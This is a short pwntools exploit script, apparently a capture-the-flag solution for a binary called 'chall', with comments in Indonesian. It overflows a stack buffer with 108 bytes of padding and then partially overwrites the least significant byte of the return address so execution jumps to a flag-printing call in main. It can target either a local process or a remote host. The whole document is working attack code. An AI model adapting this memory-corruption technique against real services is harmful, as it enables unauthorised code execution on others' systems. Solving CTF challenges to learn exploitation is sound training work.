from pwn import *
import sys

BINARY = "chall"
context.binary = exe = ELF(BINARY, checksec=False)
context.terminal = "konsole -e".split()
context.log_level = "INFO"
context.bits = 64
context.arch = "amd64"


def init():
    if args.RMT:
        p = remote(sys.argv[1], sys.argv[2])
    else:
        p = process()
    return Exploit(p), p


class Exploit:
    def __init__(self, p: process):
        self.p = p

    def debug(self, script=None):
        if not args.RMT:
            if script:
                attach(self.p, script)
            else:
                attach(self.p)

x, p = init()

x.debug((
    "break *vuln+87\nc\n" # while ( v3 != 121 )
    "c\n"*56 # continue sampai v3 ter overwrite
    # "break *vuln+98\nc\n" # break point return
))

padding = b"A"*108
payload = padding
payload += p8(142) # index last significant byte dari return address
payload += p8((exe.sym['main']+23) & 0xff) # last significant byte dari fungsi main+23 = call flag

p.sendline(payload)

p.interactive()